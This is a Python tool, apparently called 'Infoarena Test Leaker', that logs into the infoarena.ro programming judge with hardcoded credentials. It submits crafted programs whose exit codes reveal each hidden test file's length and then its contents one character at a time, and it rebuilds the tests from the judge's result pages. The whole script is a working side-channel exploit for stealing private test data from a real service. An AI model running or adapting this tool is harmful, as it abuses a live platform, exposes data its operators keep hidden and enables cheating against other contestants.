import requests, sys, time, os

print ("""
		Infoarena

▄▄▄█████▓▓█████   ██████ ▄▄▄█████▓    ██▓    ▓█████ ▄▄▄       ██ ▄█▀▓█████  ██▀███  
▓  ██▒ ▓▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒   ▓██▒    ▓█   ▀▒████▄     ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░▒███   ░ ▓██▄   ▒ ▓██░ ▒░   ▒██░    ▒███  ▒██  ▀█▄  ▓███▄░ ▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒▓█  ▄   ▒   ██▒░ ▓██▓ ░    ▒██░    ▒▓█  ▄░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
  ▒██▒ ░ ░▒████▒▒██████▒▒  ▒██▒ ░    ░██████▒░▒████▒▓█   ▓██▒▒██▒ █▄░▒████▒░██▓ ▒██▒
  ▒ ░░   ░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░      ░ ▒░▓  ░░░ ▒░ ░▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
    ░     ░ ░  ░░ ░▒  ░ ░    ░       ░ ░ ▒  ░ ░ ░  ░ ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░         ░   ░  ░  ░    ░           ░ ░      ░    ░   ▒   ░ ░░ ░    ░     ░░   ░ 
            ░  ░      ░                  ░  ░   ░  ░     ░  ░░  ░      ░  ░   ░     
    
									v1.0
""")

def PostProgram (Code):
	r = requests.post('https://infoarena.ro/submit', files={'task_id':(None, pb), 'solution':('test.py',Code), 'round_id':(None, 'arhiva'), 'compiler_id':(None, 'py')}, cookies=cookies, headers=headers)

def GetResults ():
	r = requests.get('https://infoarena.ro/monitor?task=' + pb + '&user=Leaky', cookies=cookies, headers=headers)
	id = 0
	IDs = r.text.split('<a href="/job_detail/')[1:]
	for i in IDs: #Get Max ID in Page
		TempID = int(i.split('"')[0].split('?')[0])
		if (TempID > id):
			id = TempID
			
	ok = 0
	while ok == 0:
		r = requests.get('https://infoarena.ro/job_detail/' + str(id), cookies=cookies, headers=headers)
		if (r.text.find('<strong>done</strong>') != -1):
			ok = 1
		else:
			time.sleep(1)
			
	tests = r.text.split('<tbody>')[1].split('</tbody>')[0].split('<tr class')[1:]
	tempdict = {}
	
	for i in tests:
		i = i.split('<td class')[1:]
		testcount = int(i[0].split('</td>')[0].split('number">')[1])
		res = int(i[2].split('Non zero exit status: ')[1].split('</td>')[0])
		tempdict[testcount] = res
		
	return tempdict

headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36'}

sys.stdout.write("[INFO] Logging in...")
sys.stdout.flush()
r = requests.post('https://infoarena.ro/login', data={'username':'Leaky', 'password':'leakmeplease', 'remember':'on'}, headers=headers, allow_redirects=False)
cookies = {'infoarena2_session':r.cookies['infoarena2_session']}
print ("OK!")

ok = 0
while ok == 0:
	sys.stdout.write("Problem Name: ")
	sys.stdout.flush()
	pb = input()

	r = requests.get('https://infoarena.ro/problema/' + pb)
	if (r.text.find("Autor") != -1):
		ok = 1
	else:
		print ("[ERR] Invalid Problem Name.")

print ("[INFO] Problem Name OK!")
if not os.path.exists(pb):
	os.makedirs(pb)

lastchar = 1

if os.path.exists(pb + "/metadata"):
	meta = open(pb + "/metadata", "r")
	dat = meta.read()
	if (dat[0] != '0'): #Unexpected Exit
		sys.stdout.write("[INFO] Recovering Last Session...")
		sys.stdout.flush()
		lastchar = int(dat)
		print ("OK.")
		print ("[INFO] Continuing from Character #" + str(lastchar))
	else:
		print ("[WARN] This problem might have already been fully leaked. Please delete the metadata file if you want to leak it again.")
		exit()

print ("[INFO] Leaking Test Lenghts...")
PostProgram('exit(len(open("' + pb + '.in", "r").read()))') #Get Test Lengths
pbdata = GetResults()
testlengths = {}
maxlen = 0
maxtest = 0

for i in pbdata:
	testlengths[i] = pbdata[i]
	print ("[INFO] Test #" + str(i) + " has a length of " + str(pbdata[i]))
	if (pbdata[i] > maxlen):
		maxlen = pbdata[i]
	if (i > maxtest):
		maxtest = i

print ("[INFO] Creating files...")
fds = {}

for i in range(1, maxtest + 1):
	if (lastchar == 1):
		try:
			os.remove(pb + "/" + pb + "_test" + str(i) + ".in")
		except:
			pass
	fds[i] = open(pb + "/" + pb + "_test" + str(i) + ".in" , "a")

for it in range(lastchar, maxlen + 1):
	open(pb + "/metadata", "w").write(str(it))
	print ("[INFO] Leaking character #" + str(it))
	PostProgram('exit(ord(open("' + pb + '.in", "r").read()[' + str(it - 1) + ']))')
	pbdata = GetResults()
	
	for i in pbdata:
		if (it < testlengths[i]):
			fds[int(i)].write(chr(pbdata[i]))
open(pb + "/metadata", "w").write('0')